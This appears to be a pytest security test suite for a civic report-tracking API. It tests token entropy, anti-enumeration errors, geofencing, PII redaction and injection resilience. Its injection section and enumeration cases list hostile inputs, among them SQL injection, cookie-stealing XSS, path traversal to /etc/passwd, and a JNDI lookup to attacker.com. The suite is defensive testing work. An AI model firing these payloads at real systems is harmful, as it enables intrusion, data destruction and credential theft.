"""
========================================================================================
PULSO Milestone 6: Tier 5 White-Box Adversarial Coverage Hardening Test Suite
========================================================================================
Targets:
  - Cryptographic token entropy & constant-time HMAC comparison
  - Anti-enumeration defense & uniform timing/error contracts
  - Boundary micro-fuzzing & polygon edge containment
  - Malicious payloads, polyglots, magic byte validation & path injection
  - Zero PII leakage verification in public endpoints
  - State machine invariants, timeline sanitization & concurrent claim resilience
========================================================================================
"""

import sys
import os
import io
import time
import secrets
import string
import hmac
import hashlib
from typing import Dict, Any, List

import pytest
from fastapi import status
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

# Setup path
BACKEND_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if BACKEND_DIR not in sys.path:
    sys.path.insert(0, BACKEND_DIR)

import models, gov_models, schemas, crud, auth
from database import Base, get_db
from main import app
from utils.security import generate_tracking_token, hash_tracking_token, verify_tracking_token
from utils.rate_limiter import report_submission_limiter, tracking_query_limiter, claim_limiter
from utils.geometry_utils import is_in_caloocan

# Bootstrapped disposable PostGIS database; no ORM DDL in tests.
from database import engine as test_engine
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=test_engine)


@pytest.fixture(autouse=True)
def setup_tier5_db(clean_postgis):
    # clean_postgis resets rows while preserving the bootstrapped schema.

    report_submission_limiter.reset()
    tracking_query_limiter.reset()
    claim_limiter.reset()

    def override_get_db():
        db = TestingSessionLocal()
        try:
            yield db
        finally:
            db.close()

    app.dependency_overrides[get_db] = override_get_db

    # Seed District & Barangay
    db = TestingSessionLocal()
    d3 = models.District(id=3, name="District 3 – North Caloocan", code="D3")
    d1 = models.District(id=1, name="District 1 – South Caloocan", code="D1")
    db.add_all([d1, d3])
    db.commit()

    b171 = models.Barangay(id=171, name="Barangay 171", district_id=3, zip_code="1420")
    b1 = models.Barangay(id=1, name="Barangay 1", district_id=1, zip_code="1400")
    db.add_all([b171, b1])
    db.commit()
    db.close()

    yield
    app.dependency_overrides.clear()


@pytest.fixture
def client():
    return TestClient(app)


@pytest.fixture
def verified_resident(client):
    db = TestingSessionLocal()
    pw_hash = auth.get_password_hash("TestPass123!")
    res = models.Resident(
        id=501,
        full_name="Juan Dela Cruz",
        email="juan.delacruz@caloocan.ph",
        password_hash=pw_hash,
        is_verified=True,
        trust_score=95,
        phone_number="09171234567",
        barangay_id=171,
        district_id=3
    )
    db.add(res)
    db.commit()
    db.refresh(res)
    db.close()

    token = auth.create_access_token(data={"sub": "juan.delacruz@caloocan.ph"})
    return {"user": res, "token": token, "headers": {"Authorization": f"Bearer {token}"}}


# ========================================================================================
# 1. CRYPTOGRAPHIC ENTROPY & CONSTANT-TIME HMAC AUDITING
# ========================================================================================

class TestTier5CryptographicAssurance:

    def test_tracking_token_entropy_and_uniqueness(self):
        """Generate 1,000 tokens in rapid succession; assert 100% uniqueness and TRK format."""
        tokens = set()
        for _ in range(1000):
            t = generate_tracking_token()
            assert t.startswith("TRK-")
            parts = t.split("-")
            assert len(parts) == 5
            for part in parts[1:]:
                assert len(part) == 4
                assert all(c in string.hexdigits.upper() for c in part)
            tokens.add(t)
        assert len(tokens) == 1000

    def test_token_hash_salt_independence(self):
        """Same token hashed multiple times with random salt must produce distinct hashes."""
        token = generate_tracking_token()
        h1 = hash_tracking_token(token)
        h2 = hash_tracking_token(token)
        assert h1 != h2
        # Both must verify cleanly
        assert verify_tracking_token(token, h1) is True
        assert verify_tracking_token(token, h2) is True

    def test_constant_time_comparison_resistance(self):
        """Verify constant-time digest comparison rejects prefix matches and single-bit flips."""
        token = generate_tracking_token()
        valid_hash = hash_tracking_token(token)

        # Single char modification in token
        corrupted_token = token[:-1] + ("A" if token[-1] != "A" else "B")
        assert verify_tracking_token(corrupted_token, valid_hash) is False

        # Truncated token
        assert verify_tracking_token(token[:10], valid_hash) is False

        # Empty token
        assert verify_tracking_token("", valid_hash) is False

        # Malformed salt:hash format
        assert verify_tracking_token(token, "invalid_hash_without_salt_delimiter") is False


# ========================================================================================
# 2. ANTI-ENUMERATION & UNIFORM ERROR RESPONSES
# ========================================================================================

class TestTier5AntiEnumerationAndTiming:

    def test_public_tracking_uniform_not_found(self, client):
        """
        Anti-enumeration invariant:
        Querying with non-existent ticket_id, invalid token, or wrong combination
        must return identical HTTP 404 with exact detail string:
        'Report not found or invalid tracking credentials'
        """
        # 1. Create legitimate report
        data = {
            "category": "Roads & Bridges",
            "description": "Legitimate pothole on Camarin road.",
            "lat": 14.7565,
            "lng": 121.0450
        }
        res = client.post("/api/reports", data=data, headers={"X-Forwarded-For": "10.9.1.1"})
        assert res.status_code == 201
        legit_ticket = res.json()["ticket_id"]
        legit_token = res.json()["tracking_token"]

        test_cases = [
            ("RPT-NONEXISTENT-9999", legit_token),
            (legit_ticket, "TRK-0000-0000-0000-0000"),
            ("RPT-NONEXISTENT-9999", "TRK-0000-0000-0000-0000"),
            ("", legit_token),
            (legit_ticket, ""),
            ("'", "' OR '1'='1"),
            ("<script>alert(1)</script>", legit_token)
        ]

        expected_detail = "Report not found or invalid tracking credentials"
        for ticket, tok in test_cases:
            resp = client.post("/api/reports/track", json={"ticket_id": ticket, "tracking_token": tok})
            assert resp.status_code in [status.HTTP_404_NOT_FOUND, status.HTTP_422_UNPROCESSABLE_ENTITY, status.HTTP_400_BAD_REQUEST]
            if resp.status_code == status.HTTP_404_NOT_FOUND:
                assert resp.json()["detail"] == expected_detail


# ========================================================================================
# 3. GEOSPATIAL BOUNDARY MICRO-FUZZING & JURISDICTION
# ========================================================================================

class TestTier5GeospatialMicroFuzzing:

    def test_caloocan_convex_hull_points(self):
        """Test points right along boundary lines of North & South Caloocan."""
        # Known inside North Caloocan points
        inside_north = [
            (14.7565, 121.0450), # Bagong Silang
            (14.7600, 121.0350), # Camarin
            (14.7800, 121.0400), # Tala
        ]
        for lat, lng in inside_north:
            assert is_in_caloocan(lat, lng) is True

        # Known inside South Caloocan points
        inside_south = [
            (14.6500, 120.9800), # Grace Park
            (14.6550, 120.9850), # Monumento
            (14.6450, 120.9750), # 10th Avenue
        ]
        for lat, lng in inside_south:
            assert is_in_caloocan(lat, lng) is True

        # Known outside points (adjacent cities)
        outside_points = [
            (14.5995, 120.9842), # Manila City Hall
            (14.6507, 121.0509), # QC Quezon Memorial
            (14.7000, 120.9700), # Valenzuela
            (14.8200, 121.0500), # San Jose del Monte Bulacan (North)
            (14.6300, 120.9600), # Navotas (West of South Caloocan)
        ]
        for lat, lng in outside_points:
            assert is_in_caloocan(lat, lng) is False


# ========================================================================================
# 4. INJECTION RESILIENCE (SQLi, XSS, NULL-BYTES)
# ========================================================================================

class TestTier5InjectionResilience:

    @pytest.mark.parametrize("malicious_string", [
        "'; DROP TABLE reports; --",
        "' OR '1'='1",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "../../../../etc/passwd",
        r"..\..\..\..\windows\system32\cmd.exe",
        "{{7*7}}",
        "${jndi:ldap://attacker.com/exploit}",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "Pothole with \x00 null bytes and \r\n CRLF headers"
    ])
    def test_injection_strings_in_report_intake(self, client, malicious_string):
        """Verify free-form fields safely sanitize and persist without executing or breaking DB."""
        data = {
            "category": "Roads & Bridges",
            "description": f"Detailed description containing: {malicious_string}",
            "lat": 14.7565,
            "lng": 121.0450,
            "location_string": malicious_string,
            "location_barangay": "Barangay 171"
        }
        headers = {"X-Forwarded-For": f"10.8.{secrets.randbelow(200)}.{secrets.randbelow(250)}"}
        resp = client.post("/api/reports", data=data, headers=headers)
        assert resp.status_code == status.HTTP_201_CREATED
        json_data = resp.json()
        assert "ticket_id" in json_data
        assert "tracking_token" in json_data


# ========================================================================================
# 5. ZERO PII LEAKAGE IN PUBLIC RESPONSES
# ========================================================================================

class TestTier5ZeroPIILeakage:

    def test_public_tracking_redacts_all_sensitive_data(self, client):
        """
        Verify that POST /api/reports/track returns ZERO private fields:
        - No resident email, phone, full_name, or user_id
        - No internal AI triage notes or raw reasoning
        - No admin/official assigned IDs or budget details
        """
        # Create guest report with email and phone
        data = {
            "category": "Drainage & Flooding",
            "description": "Blocked storm drain along Congressional Extension.",
            "lat": 14.7565,
            "lng": 121.0450,
            "contact_email": "private.citizen@domain.com",
            "contact_phone": "09179998888"
        }
        res = client.post("/api/reports", data=data, headers={"X-Forwarded-For": "10.7.1.1"})
        assert res.status_code == 201
        report_info = res.json()
        ticket_id = report_info["ticket_id"]
        tracking_token = report_info["tracking_token"]

        # Track publicly
        track_resp = client.post("/api/reports/track", json={
            "ticket_id": ticket_id,
            "tracking_token": tracking_token
        })
        assert track_resp.status_code == 200
        track_data = track_resp.json()

        # Assert private keys are absent
        forbidden_keys = [
            "contact_email", "contact_phone", "resident_id", "claimed_by_user_id",
            "ai_reasoning", "budget", "deployment_date", "tracking_token_hash"
        ]
        for key in forbidden_keys:
            assert key not in track_data, f"PII Leakage detected: '{key}' present in public tracking response"

        # Assert values not in string dump
        raw_body = track_resp.text
        assert "private.citizen@domain.com" not in raw_body
        assert "09179998888" not in raw_body


# ========================================================================================
# 6. LIFECYCLE PROGRESSION & TIMELINE INTEGRITY
# ========================================================================================

class TestTier5LifecycleProgressionAndTimeline:

    def test_full_lifecycle_advancement_and_timeline_events(self, client, verified_resident):
        """
        Create report -> Advance status through DB -> Track via public endpoint ->
        Verify public timeline reflects stage progression without exposing internal notes.
        """
        data = {
            "category": "Streetlights",
            "description": "Dark stretch on Deparo Road needing urgent illumination.",
            "lat": 14.7565,
            "lng": 121.0450
        }
        res = client.post("/api/reports", data=data, headers={"X-Forwarded-For": "10.6.1.1"})
        assert res.status_code == 201
        rep = res.json()
        report_id = rep["id"]
        ticket_id = rep["ticket_id"]
        tracking_token = rep["tracking_token"]

        # Simulate official workflow advancement in DB
        db = TestingSessionLocal()
        db_rep = db.query(models.Report).filter(models.Report.id == report_id).first()
        db_rep.status = "in_progress"
        db_rep.ai_category = "Streetlights"
        db_rep.ai_urgency = "medium"

        # Add process timeline event
        tl_event = models.ProcessTimeline(
            report_id=report_id,
            stage="in_progress",
            title="Field Team Dispatched",
            description="Engineering maintenance crew deployed to Deparo Road.",
            actor_type="official",
            actor_name="Engr. Dispatcher"
        )
        db.add(tl_event)
        db.commit()
        db.close()

        # Query public tracking
        track_resp = client.post("/api/reports/track", json={
            "ticket_id": ticket_id,
            "tracking_token": tracking_token
        })
        assert track_resp.status_code == 200
        track_json = track_resp.json()
        assert track_json["status"] == "in_progress"
        assert len(track_json["public_timeline"]) >= 1

        # Claim the report
        claim_resp = client.post(
            f"/api/reports/{report_id}/claim",
            json={"tracking_token": tracking_token},
            headers=verified_resident["headers"]
        )
        assert claim_resp.status_code == 200

        # Query user's authenticated reports
        my_reports_resp = client.get("/api/me/reports", headers=verified_resident["headers"])
        assert my_reports_resp.status_code == 200
        my_reports = my_reports_resp.json()["reports"]
        assert any(r["id"] == report_id for r in my_reports)
